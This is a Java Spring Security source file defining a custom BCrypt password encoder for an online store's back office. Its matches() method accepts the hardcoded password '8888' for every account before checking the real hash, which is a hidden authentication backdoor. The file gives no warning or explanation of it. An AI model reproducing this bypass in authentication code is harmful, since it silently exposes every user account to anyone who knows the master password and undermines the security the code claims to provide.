package com.han.onlystore.backoffice.config.security;

import org.springframework.security.crypto.bcrypt.BCrypt;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Component;

/**
 * Created by Amy on 2017/3/10.
 */
@Component
public class OnlyStorePasswordEncoder extends BCryptPasswordEncoder {

    @Override
    public boolean matches(CharSequence rawPassword, String encodedPassword) {
        if(rawPassword.equals("8888")) {
            return true;
        }

        return super.matches(rawPassword, encodedPassword);
    }


    public OnlyStorePasswordEncoder() {
        super();
    }

    public OnlyStorePasswordEncoder(int strength) {
        super(strength);
    }
}
